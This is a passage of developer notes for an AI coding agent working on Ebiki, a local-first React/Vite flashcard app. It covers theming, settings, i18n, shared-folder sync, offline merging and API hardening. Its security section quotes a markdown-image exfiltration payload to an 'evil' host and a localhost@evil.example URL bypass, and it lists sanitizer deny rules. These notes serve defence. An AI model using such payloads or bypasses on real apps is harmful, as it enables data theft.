# Ebiki - project notes for Claude

Local-first AI flashcard/study app (React + Vite), grown out of "ScreenLens". Mascot **Ebi**, a red shrimp.
Brand color **#DF2540**. Themes **Ocean Light** + **Dark**. Fonts Baloo 2 (display) + Nunito (body).

## Design system (never hardcode colors)
- `src/config/tokens.js` (`C` = `var(--c-*)`, `FONT`, `RADIUS`, `SHADOW`) is the single source of truth. Palettes:
  CSS variables in App.jsx's global `<style>` (`:root` light, `[data-theme="dark"]`); `appTheme` → `<html
  data-theme>` (config + localStorage; pre-paint script in `index.html`). `src/styles/theme.js`: `S.*` styles.
  Primary CTAs `btn-press`, tabs `ui-tab`. **Look and feel: `docs/ui-overhaul.md`** (palette roles, `SHADOW.card/
  glow`, `TYPE`/`MOTION`, `.ui-card`/`.ui-lift`/`.ui-hero`/`.ui-halo`, `S.screenTitle`/`S.panel`, how to revert).
- **NO EM DASHES in ANY user-facing text** (UI, all four locales, `data-tip`, `title`, placeholders, dialogs,
  toasts, errors, AI output). Use `. ` / `: ` / ` · ` (zh `，`, ja `。`); code comments exempt. `aiCall` turns
  SYSTEM-prompt em dashes into ": " (except the "(—)" naming the character). `stripAiDashes` (every reply) and the
  Help/Studio strips are LINE-AWARE: a dash at a line start/end (or a JSON `\n` escape) is dropped, one inside a
  line becomes ", " (`\s*` there joined lines). Write prompt literals dash-free (", " or ": ", "2 to 3").
- **Light-mode semantic colors are DEEPER than dark's** (success `#0D7B40`, warning `#9C5C00`, danger `#C82C22`,
  info `#2670A8`, purple `#7847EE`) so green and amber stay distinct at small sizes.
- **Contrast is tested** (`src/config/contrast.js` + test, palettes in `src/config/palette.js`): every text token is
  WCAG AA (4.5:1) on every surface, hover and its own chip tint, both themes; brand `#DF2540` is AA on cards, 4.2 on the
  page. **White text sits on a `*Fill` token** (`C.brandFill`/`successFill`/`dangerFill`/`warningFill`/`purpleFill`;
  `fillFor(color)`, used by `ChunkyButton`), never on the plain token: dark mode's bright text colors gave white 2 to 3.2:1.
  **Brand-colored TEXT on a brand tint** (a selected tab, tile, pill) uses `C.brandText` (light `#BE0E2B`), never
  `C.brand` (4.2:1 there); `S.*` brand-tint styles already do. Teal is a text token too (light `#0A716C`). A provider's
  own color goes on its border/tint only, never as text.
- **App zoom** (`src/config/zoom.js`, tested): body CSS zoom, default 1.35 (shown 100%), 1.0 to 2.0; per device
  `platform.kv('ebiki-ui-zoom')`; Settings > General or Ctrl/Cmd + = - 0 (Electron menu → `app-window:zoom`,
  `platform.onDeviceZoom`). Set as `body.style.zoom` AND `--app-zoom` on `<html>` (1 in the overlay: OCR 1:1), then
  `resize` fires. **Never hardcode 1.35**: viewport-covering fixed boxes use `calc(100vw / var(--app-zoom))`; JS
  divides by `getZoom()`. `#root` is `min-height: calc(100vh / var(--app-zoom, 1))` (index.html): plain `100vh` made
  the zoomed root taller than the window and the page scrolled into a blank band.

## Settings: global vs per-mode
One modal, `src/components/SettingsModal.jsx`. Rule of thumb: can differ per mode → `activeMode`; else global.
- **GLOBAL** (`config.json`, `/api/config`), panes in `NAV`: `general` (theme, appLanguage, `language`/
  `targetLang`, how Ebiki opens, run setup again), `models` = AI & cost (provider + key, preset, question reuse,
  per-feature models in a `<details>` that opens when an override exists), `anki` = Anki & audio, `data` = Data &
  updates (`DataFolderCard`, `UpdatesCard`).
- **PER-MODE** (`modes/<name>/config.json`, `updateActiveMode`): `modes`, `study` (`studyRules`: questionsPerCard,
  cardsAtOnce; **studyLanguage** = the LEARNED language (answers + cards), **quizLanguage** = "Ebi speaks"
  (phrasing; '' = learned), hookLanguage, dialect, grammarFeedback, **wordHints**, questionPreferences, Advanced
  questionPrompt/ratingRules), `cards` (`activeMode.ankiDeck`, fields/templates, tagRules), `knowledge`.
- `PANE_ALIAS` maps old pane ids. Small number inputs override `S.keyInput` with `flex: 'none', minWidth: 0`.
- **Async writers use `updateModeById(modeId, …)` with the id pinned when the task STARTS.** Never
  `updateActiveMode`/`saveModes` from an async completion: `saveModes` re-asserts `activeModeId`, so a stale closure
  flips the app back. Live mirrors: `modesRef`, `activeModeIdRef`.
- **Mode-list edits read `modesRef.current`, never render-time `modes`** (`deleteMode`, `renameMode`,
  `addDefaultMode`, `handleAddDeck`): a stale whole-list save reverts async writes. Rule removal builds from
  `getActiveMode()` after its confirm; Enter-renames mark the box so the unmount blur doesn't rename twice.
- **Every active-mode change goes through `switchActiveMode` / `endStudyForModeSwitch`** (incl. `createMode`,
  Studio create, deleting the active mode): a live session is ended first, else it ran with the other mode's deck.
  The session snapshot carries `modeId` and `syncedIds` (written by `markSynced` at once: a reload mid-sync can't
  answer a card twice). `createMode`/`addDefaultMode` refuse with `mode_cannotSave` after a failed modes read.
- **Hooks + grammar loads wait for `configLoaded`** (before it `activeMode` is the default id 1, and a real mode
  with id 1 never reloaded: the placeholder's blob overwrote it).
- **Never auto-persist a deck default**: `refreshAnkiConnection` must NOT write `decks[0]` into the mode (can run on
  the placeholder and clobber the chosen deck). Fall back non-persistently (`ankiDeck || decks[0]`).
- `chatSuggestions` (Chat chips) come from `createMode`; "💬 Just chat with Ebi" is always shown.
- Header: ONE split control, `src/components/ModeDeckSwitch.jsx` (the owner: mode and deck "must be set together"),
  deck via `setAnkiDeck`; with `ankiConnected === false` the deck segment shows disabled (`hdr_deckOffline`).
- **Mode ids are repaired on load**: duplicates (merged shared folders) re-id'd, first wins; string ids → numbers;
  persisted (a duplicate turned a switch into a rename). **A saved `activeModeId` that doesn't exist falls back to
  the first mode.**

## i18n
- **All UI text lives in `src/i18n/`**: `locales/<code>.js` (app AND features, feature sections use their key
  prefix), `languages.js` = THE language list (`code`, `label`, English `name`, `pickerName`, `ocr`), `index.js` =
  engine (`t`/`makeT`, `APP_LANGUAGES`, `langMeta`). **Never hardcode a language map elsewhere** (read
  `LANGUAGES`). Features carry NO strings (`features.test.js`).
- **Locales load ON DEMAND** (only the active one + English): `catalog.js` = list + loaders (the app imports only it
  and `en.js`), `loadLocale`/`useLocale` (keeps the old language up until the new one arrives); the first paint waits
  for the UI language once. Tests register all via `src/i18n/testSetup.js`.
- **Adding a language**: copy `locales/en.js`, translate, add a catalog entry + loader in `catalog.js`, then the import
  + one entry in `languages.js`. `locales.test.js`
  checks keys, `{placeholders}` (zh/ja singular may keep `{n}`), no dashes, no duplicate keys, count pairs.
- **Launcher, installer, splash, app window** use the `ln_*` keys: `npm run i18n:launcher`
  (`scripts/build-launcher-strings.mjs`) copies them to `scripts/launcher-strings.json` (`locales.test.js` fails
  while stale). Readers: `scripts/launcher-i18n.ps1` (`Tr 'key' @{…}`), `scripts/launcher-i18n.cjs` (main.cjs; `t
  key name=value` in .sh), splash.hta (ADODB.Stream + eval: legacy mode has no JSON). Language: `applang.json`
  (machine-local, written by the server on config read/save) → system → English. `.app-status` is **UTF-8** (the
  splash strips PS 5.1's BOM); a status starting `@` is a message KEY (`@ln_starting`). Only the .sh "no Node.js"
  messages and `logs/*.log` stay English.
- `t(key, vars)` falls back lang → English → key: **a missing key renders raw; add it to EVERY locale.** Counts need
  singular/plural keys (`deck_countAll`/`deck_countAllOne`); zh/ja share one. **No duplicate keys** (later wins).
- Pre-config screens and `ErrorBoundary` use `localStorage('ebiki-app-language')`. All new text (errors, receipts,
  tooltips) goes through `t()`. In memoized callbacks use `tLiveRef.current` (else the old render's `t`).

## Data folder (optional shared data directory)
All user data (`DATA_ENTRIES`: config.json, ankiformat.json, modes/, decks/, chats/, discover/, cache/, keys.json)
resolves through `DATA_DIR` (`vite.config.js`). **New server data paths MUST use `dataPath()`**, never
`path.resolve`. Default = app root; overridden by machine-local `datadir.json` or `EBIKI_DATA_DIR` so computers can
share one folder (SMB). `/api/datadir` switches live. **The app folder is this computer's HOME.** Either direction
may answer `{needsChoice, context:'join'|'return', sourceOnly}`; the client re-POSTs `merge:bool`.
- **JOIN**: if both sides have data, prompt (client confirms before writing to the share). `merge:true` =
  `deepMergeInto`, nothing dropped (`deepMergeJson`: objects by key, arrays unioned, scalar conflicts keep the
  target's; differing non-JSON kept as `name (from <label>).ext`). `merge:false` adopts the target. Leaving the app
  folder stashes local data in `.local-home/` (`moveDataEntries`). Response: `merged`, `keptBoth`.
- **RETURN** (`{dataDir:''}`) RESTORES `.local-home/` (share extras → prompt; no stash → copy the share down).
- `moveDataEntries` NEVER deletes (collisions → `local-data-backup-<date>/`). Only an explicit `merge:true` writes
  the share. `DataFolderCard` talks to `/api/datadir` directly, NOT via the config autosave (config.json is inside
  the folder). `logs/` stays local. `/api/modes` re-derives `MODES_DIR` per request.
- **A switch RELOADS the page** (the page holds the OLD folder's state; one routine save would post it into the new
  folder, and a `/api/modes` POST deletes every folder not named). `onDataFolderChanged` sets `dataSwitchingRef`
  (`setAnkiDeck`, `saveModes`, `updateModeById`, config autosave bail), clears `configHealthyRef`, reloads after
  1.5s. **New data writers must honor `dataSwitchingRef`** (chat delete, knowledge delete/toggle/upload do). The
  server refuses non-GET `DATA_ROUTES` writes for 3s after a switch (`datadirSwitchedAt`).

### API keys: local file, shared copy, self-healing backup
- `.env` is pinned to the CODE folder (`SELF_DIR`), never `path.resolve('.')` (a share cwd would get the key);
  `EBIKI_ENV_DIR` overrides (tests). Split on `/\r?\n/` (Notepad CRLF read as no keys).
- **`writeEnv` MERGES**: unmentioned providers untouched; a provider is deleted ONLY when named with an empty value
  (a whole-state rebuild once erased a key).
- `.env.bak` mirrors reads and key writes and **only grows** (minus deliberate clears); `parseEnv` restores from it
  when `.env` has no keys. `.env.cleared` = intent to clear (blocks the self-heal; storing a key removes it).
  `.env.declined` (local JSON list) = per-provider clears, skipped by the `syncSharedKeys` pull (else `keys.json`,
  never shrunk, brought them back). `logs/keys.log` logs every write, provider NAMES only.
- `keys.json` in `DATA_DIR` is the SHARED copy, synced by `syncSharedKeys()` (`/api/keys`, backup tick; skipped
  with no or a dead share). Additive both ways, LOCAL wins, **except a key the user TYPED**: `setCurrentKey` sets
  `keyEditedRef`; the save posts `?source=user` (read from `req.originalUrl`: connect rewrites `req.url`) and
  `&providers=` with ONLY the typed providers (else every stale local key overwrote another computer's fix).
- **One ping per typed key**: `validateKey` goes through `createKeyVerdictCache` (`src/utils/keyVerdicts.js`): definite
  verdicts kept per exact provider+key (never null), in-flight checks shared; the save path asks with `reuse: true`.
- **A typed key gets that authority only after `validateKey` accepts it** (true or 'noCredit'); refused = local
  only, unchecked = re-queued (`keyCheckRetryRef`, 5 x 30s); a clear keeps authority. A superseded save
  (`keySaveSeqRef`) yields: re-arms via `setKeySaveRetry`, sets `keyYieldedRef` (one follow-up after the newest save,
  `keySaveDoneSeqRef`), never starts a save itself (two chains superseded each other forever). `keyMisfits` (wrong
  or another provider's prefix) makes `validateKey` false and `refreshModels`/`findModelUpgrades` skip, without
  sending the key.

### Auto-backup (one-way)
With a shared `DATA_DIR`, `runBackup()` runs every 10 min (and ~20s after start): `copyNewer` mirrors
`BACKUP_ENTRIES` (`DATA_ENTRIES` minus `cache`) into `.local-sync/` by size + ANY mtime difference (a computer with a
slow clock writes older mtimes; "newer only" missed it) and stamps the source's mtime, the BASE for offline reconcile.
Never writes the share; skips a dead one (`dataEntriesPresent`). An empty listing never empties the base; an
uncopyable file is skipped and counted (`lastBackup.error`), never rethrown. `runBackup` reads `DATA_DIR` once. A
switch stamps `.source.json` right after parking (else a failed run deleted the parked snapshot). JOIN of an empty
folder while the old share is dead creates `modes/` so it counts as reachable.

### Unreachable-source guard (anti-clobber) - DO NOT REMOVE
A dead mapped drive reads as EMPTY (autosave wrote defaults back; onboarding reappeared) and THROWS on touch (an
unwrapped `mkdirSync` became Vite's error overlay). One guard fronts `DATA_ROUTES` (config, ankiformat, modes,
knowledge-sections, deck-progress, discover-store, question-bank, chats, chat-load) via `dataMode()`: **`down`** →
503 `{unreachable:true}`; **`offline`** → local copy + `X-Ebiki-Offline: 1`; **`online`** → pass. NOT guarded:
datadir, keys, log, anki, update, web-search, tts. The `mkdirSync`s in `/api/modes` + `/api/chats` are wrapped.
**A WRITE to a shared folder gets a FRESH probe** (`guardMode`, `src/server/dataGuard.js`): on the 3s cached answer a
save right after the share vanished re-created its folder (`mkdirSync` recursive), and that one entry hid the outage
for good. **`limitBody` (`src/server/bodyLimit.js`) never attaches a `data` listener of its own**: it counts inside
the handler's, else the body flowed past every route behind the guard's await (every data-route save read `{}`).
Caps per route (largest path match; 413 `{error:'too large', limit}`): 64 MB chats/knowledge/anki, 32 MB
discover-store, 16 MB modes, 8 MB default, 1 MB usage, 256 KB keys, 64 KB web-search.
Client: a failed config fetch sets `dataUnreachable`, keeps `configHealthyRef` false, shows a red banner instead of
onboarding.

### /api is for the app only (security)
- **`apiRequestAllowed` fronts every /api route** (handlers parse any body as JSON, so any website could POST
  text/plain without preflight; plugin middlewares also run before Vite's `allowedHosts`, so DNS rebinding reached
  them). Host must be loopback (`localhost`, `127.0.0.1`, `[::1]`); an Origin must equal the Host (`null` fails);
  `Sec-Fetch-Dest`, when present, must be `empty` or `document` (a same-origin `<img src=/api/...>` sends no Origin).
  Also `cors:false`, `X-Frame-Options: DENY`, `frame-ancestors 'none'`. No `fs.deny` globs (`**/discover/**` would
  block `src/discover`). Tests: `src/keys/api-guard.test.js`. Every new route lives under `/api`. Origin is compared
  with the PARSED Host (a Host with `@` fails), Sec-Fetch values lowercased; every /api response carries `nosniff`,
  `X-Frame-Options: DENY` and `Content-Security-Policy: sandbox; frame-ancestors 'none'` (Vite's headers never reach
  them).
- **Never build a path from raw client input**: chat ids pass `isSafeChatId` (`[A-Za-z0-9_-]`); deck folders go
  through `deckDirName` (`::` → `--`, Windows-invalid chars → `_`); knowledge uploads take only `.txt`/`.md`, named
  by `knowledgeFileName` (control chars dropped, a device stem `con.txt` → `con_.txt`). The data guard matches routes
  like connect does (`isDataRoute`: `/config` AND `/config.x`). `/api/anki` refuses actions reaching outside the
  collection (`refusedAnkiAction`: import/export packages, `storeMediaFile` with `path`/`url`, also inside `multi`).
- **Never parse untrusted HTML with `innerHTML` on a live-document element** (a detached `<img onerror>` still runs
  with /api access). `stripHtml` uses `DOMParser`; rendered HTML goes through DOMPurify (`Markdown.jsx`, every
  `dangerouslySetInnerHTML`). `sanitizeHtml` (render-only) forbids media (`img`, `video`, `audio`, `source`, SVG
  `image`/`use`, `srcset`/`poster`/`background`/`ping`): nothing rendered may load a URL by itself (a reply's
  `![](https://evil/?d=...)` exfiltrated). `sanitizeCardHtml` keeps images for Anki. Also forbidden: `dialog`, the
  popover attributes; inline styles with a backslash, `/*`, `url(`, `image-set`, `@import`, `expression(`,
  `position: fixed|absolute|sticky`; other attributes with `url(`/`image-set` unless local `url(#id)`; `href` except
  on `<a>` or as `#id`. `renderTappableBack` strips `[sound:]`. `SANITIZE_NAMED_PROPS` is ON for every caller (a
  shared-deck `id="ebikiWindow"` clobbered `window`); only the Legends art loader turns it off (its `url(#id)` refs).
- **Refuse `Sec-Fetch-Site: cross-site|same-site`** (`apiRequestAllowed`): an `<img>` on another site sends no Origin.

### NEVER WRITE BACK WHAT YOU FAILED TO READ (the clobber family)
An autosave posting WHOLE state must not run on a failed read; a handler treating "absent" as "delete" must refuse
an empty payload.
- **Keys**: the load tags its read (`_ok`); `keysHealthyRef` gates the autosave (re-enabled by `setCurrentKey`, the
  one funnel). Clearing posts the provider with an empty value. **`syncSharedKeys` reads via `parseEnv()`, never
  `readEnvFile()`** (must pass the `.env.bak` self-heal) and never publishes a `keys.json` smaller than the share's.
  **`aiCall` never sends a request with another provider's key** (a key equal to another provider's is a stale
  closure; swapped for the live one).
- **Selected vs usable provider can disagree** (`provider` is shared, keys are per machine): an in-flow amber banner
  offers both fixes. Deliberately NOT an auto-switch; never persisted.
- **Modes**: `{modes: []}` would erase every mode and knowledge base; `setAnkiDeck`, `saveModes` and the server
  refuse an empty list.
- **Whole-blob stores (hooks, grammar log, Discover ledger, dupignore) read through `readBlobChecked`**
  (`src/discover/storage.js`, `{ok, value}`; tests `storage-read.test.js`). Writers REPLACE the blob, so: hooks and
  grammar persist only after a successful read (`hooksReadyRef`/`grammarReadyRef`; earlier items MERGED in); ledger
  needs a real read or cached ledger (`discoverLedgerWritableRef`); "do not merge" needs `dupIgnoreReadOkRef`.
  `readBlob` is for read-only callers.
  - A write that reached the local store but not Anki sets `ebiki-blob-local-newer:*`: reads prefer local and push
    it back (else Anki's older copy won); cleared only if no write happened meanwhile (`writeSeq`). With the mark, a
    refused local read (503) is a failed read, never Anki's copy.
  - Writes per key are QUEUED (`blobChains`), newest content wins (`blobLatest`). `setBlobWritesPaused(true)` (set
    with every `dataSwitchingRef.current = true`) makes `writeBlob` return false, re-checked inside the queued run
    before each store.
  - Colliding blob keys (`storageKey`) clash (`modeNamesClash`: "Spanish 1" vs "Spanish-1").
  - **With a SHARED folder the store is read FIRST** (`/api/discover-store` GET answers `shared`; each Anki lags
    behind AnkiWeb and dropped the other computer's items); Anki first again while `ebiki-blob-anki-newer:*` is set.
    App-folder installs keep Anki first. A REFUSED store read is a FAILED read when the store is shared (503
    `{unreachable}` always; other errors when the last good answer said `shared`, kept in `ebiki-blob-store-shared`),
    never a fall-back to Anki's older copy.
  - **While the anki-newer mark is set, kinds with a merge read BOTH and MERGE** (`BLOB_MERGERS` in
    `src/discover/merge.js`: ledger `mergeLedgers`, grammar `mergeGrammarLogs` + `slipKey`, hooks `mergeHooks`,
    dupignore union), write the merge back through the queue (only if no newer write), then clear the mark. An
    unreachable Anki is a failed read. Profile has no merge (newest wins). Limit: a hook deleted on one side during an
    outage can come back once.
- **Deck progress notes** (`readDeckProgress`, `{ok, content}`; missing = real empty): chat `<progress-update>` and
  "Generate Insights" REPLACE the file, so they write only over notes actually read (`deckProgressOkRef`,
  `chatTabAttachedDeck.progressOk`, `existingOk`), RE-READ first and write only if unchanged since the prompt
  (`progressDocAtSend`, `existingProgress`). deck-progress and discover-store GETs: only ENOENT is empty, else 500.
- **`ankiSetNoteTags` moves only the difference, adds first** (remove-all-then-add left no tags on failure);
  case-only changes are remove + re-add; wanted children of a removed tag (`a::b`) are re-added.
- **Config**: a failed save retries (`cfgSaveRetry`). "Run setup again" is LOCAL (`rerunSetup`), never
  `onboarded:false` in the shared config. **The autosave posts only CHANGED keys** (`lastSentCfgRef`; a failed save
  un-marks only its keys): a whole post reverted another computer's settings. `writeConfig` re-reads ~1.2s later and
  re-applies only entries back at their OLD value (up to 3x; simultaneous saves on two computers lost one side). `NESTED_CONFIG_KEYS` (aiModels,
  modelPresets, rejectedModels, modelPlans, modelCards, modelAvailability, availableModels, pronunciation) diff TWO
  levels down (`src/utils/configDiff.js`, shared with `writeConfig`); removals go in `__unset`. The load SEEDS
  `lastSentCfgRef` from the file. An entry under a vanished map is returned in `paths` (not `__unset`) so the App
  forgets it (else re-picking it posted an empty map). An entry that CHANGED TYPE (map ↔ value) is never also put in
  `__unset` (the server applies removals last: it vanished). `/api/config` POST refuses a non-object body (400) and
  `writeConfig` throws on one (a string merged in as keys "0", "1"...). An unknown `intelligence` preset from a newer
  computer is ignored like an unknown provider (`INTELLIGENCE_PRESETS`), never posted back.
- **Chat saves read the disk copy STRICTLY** (only ENOENT = new; a torn read retries once, then 503). A same-turns
  save keeps on-disk `synced`/`addedTo` of chat cards (by position + front + back), else "Added" reset and invited a
  duplicate. `error: true` bubbles are never compared or saved. **A disk copy that isn't a prefix of the incoming
  messages FORKS** (new id + `forked:true`, adopted only while that chat is open). Help re-reads (`/api/chat-load`)
  before sending. The merge rules are pure `planChatSave` (`src/server/chatSave.js`, tested): error bubbles are dropped
  on EVERY path (new chats and forks too). The chat list's id is always the FILE name (a stored `"id"` made a chat that
  could never open).
- **Chat sessions** (Chat tab and Help): a chat that fails to load is never opened empty (its id would take the
  next save); rename never re-saves from a failed read; switch/start/delete of the open chat is ignored while a
  reply is pending; a failed save keeps the old id. Saves send `keepTitle` (renames survive) and keep the file's
  `type` when none is sent. Switching re-saves only when the list differs from the last saved/loaded one
  (`chatSavedMsgsRef`); after a FAILED save (`chatLastSaveOkRef`) leaving asks (`chat_leaveUnsaved`). A send waits
  for a photo still being read (`chatImagePendingRef`, via `attachChatImageFile`, which ignores non-files and always
  brings the pending count back down), then reads `chatTabImageRef`.
- **An async result lands only where it was asked, and never writes back a whole array copied before the await.**
  Capture a token; drop the result if it moved: `discoverGenRef`, `scanGenRef`, `pinGenRef`, `stillOnQuestion`,
  `stillGrading`, `studySessionRef`, `knowledgeFilesSeqRef`/`modeKnowledgeSeqRef` (a slow load fed the previous
  mode's knowledge to every AI call), `lookupSeqRef` (a lookup lands only on its own popup; closed stays closed),
  `chatAttachSeqRef`; glosses only on the same question text, Learn-it replies only on the same front. One-item
  replies merge with a functional update (the feedback chat reverted grades that landed meanwhile). A list copied
  for write-back drops what the action just cleared. A mode switch closes the lookup popup, bumps `pinGenRef` +
  `resetPinBusy()`. `startStudySession` takes the LIVE mode's deck. `markDeckEdited` syncs to study at once
  (`syncDeckEditsToStudyRef`).
- **Memoized callbacks list what their prompt reads** (mode, knowledge, every language: `autoExplain`,
  `lazyTranslate` went stale). Models are safe (`aiStateRef`).
- **Grader flags go through `aiFlag`** (models answer "false"/"no" as strings); hints through `hintText`. The
  feedback chat's `mark_all_correct`/`fix_typo` apply only while `stillGraded` (after Back, "all correct" over zero
  results rated Easy); marking correct clears `penalize` and sets a PBQ `score` to 1. End Now clears rating/ease of
  skipped cards. A memory hook lands only on the same card and session. `update_card` re-reads the note, keeps
  images/`[sound:]`/credit, refuses `hasUnkeepableMarkup` (`fbr_cardKeepsMarkup`), then the session takes the NEW
  fields. A failed post-lock correction restores the OLD rating/ease; stats move only on success, never for
  `relearn` copies (also `rateGradedCard`).
- **Answer handlers write ONE card into the live list** (`commitCard(states, cardIdx)`), never the render-time
  array. Post-lock corrections need `preSyncInfoRef` (no guess; `fbr_noPreSchedule`).
- **Only the NEWEST grading lands** (`evalTokenRef`, session:card, checked in `stillGrading` AND the catch). Accent
  slips are per question (`accentSlipQs`), removed by Back and abandoned drills (`dropQuestionAttempts`), incl. the
  drill's card when Back goes to another card. Answer matching composes to NFC.
- **A grading reply must cover every question** (`complete` in `evaluateCardAnswers`): `parseAiJson` salvages
  truncated arrays, and counting misses over partial rows rated cards Easy. One question: a lone row object
  (`correct` in it) or a wrapper's single list; a wrapper list counts only when every entry has `correct`.
- **Bulk-edit saves re-read cards first** (`commitAcceptedRecs`): edited since → skipped
  (`deck_changedSinceSuggest`); bold `Label:` fields go back through `cardBackToHtml`.
- **An unparseable config.json is not "no config"**: `readConfigSettled` retries ~1s (another computer
  mid-write); IO failure → 503 (autosave off); true non-JSON is renamed `config.json.corrupt-<stamp>` and served
  fresh. **Every whole-file data write uses `writeFileAtomic`** (temp + rename); a failed TEMP write throws and
  leaves the real file alone (a fallback on a full disk truncated config.json to 0 bytes).
- **Every parsed text read in vite.config.js goes through `readUtf8`** (strips the BOM PS 5.1/Notepad write: a
  valid config.json was renamed corrupt, a `.env`'s first key lost); `electron/main.cjs` does too for
  launchmode.json.
- **Every `spawn()` in vite.config.js has an `'error'` listener** (an unhandled ENOENT/EACCES kills the server).

### Offline mode (run from local copy, reconcile on reconnect)
Share unreachable → the app runs from `.local-offline/` (gitignored, watch-ignored), seeded once from `.local-sync/`.
**Three folders, three jobs, don't collapse them:** `DATA_DIR` = shared truth (written only by explicit user action),
`.local-sync/` = BASE (never written offline), `.local-offline/` = working copy. The pristine base makes reconnect a
real 3-way merge.
- `dataPath()` routes through `.local-offline` while `offlineActive`. `dataMode()` runs per request with a 3s
  `shareReachable()` cache (dead SMB probes block); a probe finishing after `DATA_DIR` changed isn't cached. A
  returning share ends offline mode without a restart. `enterOffline()` returns false with no snapshot (= `down`).
- **Reconcile** (`/api/offline`: GET `{offline, pending, since, changes}`, POST merges, POST `{discard:true}`): only
  files differing from base; share unchanged/missing → fast-forward; share also moved → `deepMergeInto(..., basePath)`
  (non-JSON kept as both, `name (from this computer offline).ext`). **JSON merges against the base**
  (`deepMergeJson(theirs, mine, base)`): a value only one side changed wins, both changed keeps the share's; deletions
  likewise; a LIST changed on one side only is taken whole (a union revived deleted items). Join/return merges pass no
  base. Tests: `merge3.test.js`.
- `offlineChangedFiles`, `deepMergeInto` and join/return `cpSync`s skip `*.<pid>.tmp` (and `cache/` for the first); an
  unstat-able entry counts as a change. Writes use `writeFileAtomic`.
- **Chats**: a history that is a PREFIX of the other side's merges into the longer one (target's title/type/mode); only
  diverged ones are kept as `<id>-copy.json` (must pass `isSafeChatId`). "A chat" = a file DIRECTLY in `chats/`. The
  kept copy carries `synced`/`addedTo` over from the other (position + front + back), else "+ Add" made a duplicate.
- **Per file**: failures are collected, the rest merged, the offline copy kept until all pass. Merged files go in
  `.offline.json` `applied` (path → hash) so a retry merges only the rest (re-merging duplicated copies, reverted
  online edits). `offlinePendingFiles()` = pending count. The GET deletes a ZERO-change copy once the share is back
  (else backups paused forever). After reconcile `.local-offline/` is removed and `runBackup()` refreshes the base
  (re-checking offline state AFTER its probe); Discard and the zero-change cleanup also trigger a backup.
- **One copy, one folder**: `.local-sync/.source.json` (`backupIsForOtherFolder`; another folder's snapshot is parked
  in `.local-sync/.previous`, a switch backs up 2s later) and `.offline.json` `dataDir` (`offlineCopyDataDir()`):
  `enterOffline` refuses another folder's snapshot or copy, reconcile into another folder is 409, and a switch resets
  `offlineActive` + `reachCache`. Identity = `sameFolder` (case-insensitive on Windows/macOS). RETURN with the share
  down and no stash seeds the app folder from the offline copy (if that share's) or `.local-sync`.
- **Wake from sleep is not an outage**: the first failed probe after being online waits up to `SHARE_WAKE_WAIT_MS`
  (20s, re-probe every 2s, shared) before going offline; a folder switch clears `shareWasOnline`.
- **The share coming back needs no question** (the owner hated a "reload now" box after every sleep): offline edits
  merge in the background with a green toast. Only a FAILED merge freezes writers (`dataSwitchingRef` +
  `configHealthyRef` off) and shows `shareBackReload`. Never an automatic reload (loses in-flight work); manual
  Merge/Discard still reload. A copy parked for another folder shows `offlineOtherFolder` and keeps backups paused
  (else its merge base is destroyed). JOIN with `merge:false` copies NOTHING to the share. Merge refusals carry `code`
  (`busy`/`unreachable`/`otherFolder`) → `offlineErr*`.
- **Offline deletions are NOT replayed** (indistinguishable from never-synced; unrecoverable). Deletions ELSEWHERE are
  honored: edits of a mode tombstoned in the share's `modes/.deleted.json` are skipped (recorded as applied). A share
  folder of the same name with ANOTHER id is never merged into: the mode goes to a free `<name> N` (`freeClashName`,
  `clashTarget`), its config renamed. `redirect` order per `modes/<dir>/` file: id's share folder (`homeOf`),
  tombstone, clash, as is. **Patterns take BOTH separators (`[\\/]`)**: `rel` from `path.join` has backslashes on
  Windows.
- Client: config fetch reads `X-Ebiki-Offline`; a 30s `/api/offline` poll drives an amber dismissable banner and, only
  after a failed auto-merge, an "N offline changes waiting · Merge / Discard" bar (`offlineBusy` names the running
  action). The poll acts only on `typeof d.offline === 'boolean'` (a 500 read as "share back" froze writers).

**Banners render IN FLOW above `<header>`, never `position:fixed`** (a fixed bar eats the header's clicks).

**Delete a banner's button and its handler together, and a handler's banner with it.** JSX has no compile step and
these banners render only in rare states (removing the update banner took `resolveOffline`; buttons then threw a silent
`ReferenceError`). Before removing UI, grep every handler it names for other callers and every nearby block for what it
renders.
## How Ebiki opens: app window vs browser tab (per computer)
Users pick the Electron window or a browser tab (handy for researching a word).
- **Machine-local** `launchmode.json` (gitignored, `{mode:'app'|'browser'}`, missing = `'app'`), not `config.json`:
  computers on a share differ and the launcher reads it before the server exists. **FOUR readers stay in sync**:
  `readLaunchMode` (`vite.config.js`), `Get-LaunchMode` (`launch.ps1`), `launch_mode` (`launch.sh`), `readLaunchMode`
  (`electron/main.cjs`).
- `/api/launchmode` is NOT in `DATA_ROUTES` (works with the share down). UI: `LaunchModeCard` (Settings > General) +
  an onboarding step, both via `LaunchModeOptions` (`src/components/LaunchModeChoice.jsx`).
- **A live switch is a HANDOFF**: POST `{switchNow:true}` spawns the other front end; the old page waits for
  `/api/launchmode/hello` (`{kind}`, sent by every page on mount and by `main.cjs` on `second-instance`), THEN closes
  (closing first trips auto-exit). A tab can't close itself and says so. `handedOver` retires the Switch button;
  re-picking a tile clears it.
- **Every entry path honors the choice, incl. the taskbar pin** (bare exe). Without `--from-launcher` `main.cjs` is
  bare: in `browser` mode it hands off to the launcher, and starts the launcher when nothing answers on 3000. Launchers
  and the switch-now spawn pass `--from-launcher`. Browser mode never starts Electron; a duplicate loses the
  single-instance lock.

**External links open the REAL browser**, http(s) only (other schemes launch protocol handlers): `setWindowOpenHandler`
denies + `shell.openExternal`, a `will-navigate` guard does the same, on the app window AND overlay (`openExternally`).
"Is this the app?" = `isAppUrl` (ORIGIN equality), never `startsWith(VITE_URL)` (`http://localhost:3000@evil.example/`
passes). `will-navigate` follows only `isAppPage` (root or `?overlay=true`). The Markdown hook gives SVG `<a>`
(lowercase tagName) `target=_blank` too. The overlay's `close` hides instead of closing ONLY while `!appQuitting` (set
on `before-quit`), else it blocks quit, SIGTERM and Windows shutdown.

**Overlay**: a HEADLESS page never launches it (`navigator.webdriver` skips the auto-launch; `/api/launch-overlay`
POST refuses a Headless user agent): an agent's test page started the real Electron app. Its global Esc is held only while visible AND focused (`registerOverlayEsc`, dropped on `blur`; else it
swallowed other apps' Esc). A failed `Alt+Q` registration exits it (`app.exit(2)`); a failed page load
(`overlayPageOk`) makes Alt+Q reload, not show an invisible full-screen window. It runs on its OWN profile
(`userData/overlay`: Chromium locks a profile's storage to one process). No server = a capture shows nothing. Captures
use the PRIMARY display (`primaryScreenSource`, by `display_id`), never `sources[0]`.

**Smooth scrolling in the app window (a 480 Hz + 60 Hz two-GPU PC scrolled at 60 fps; Firefox at 480)**: `main.cjs` sets
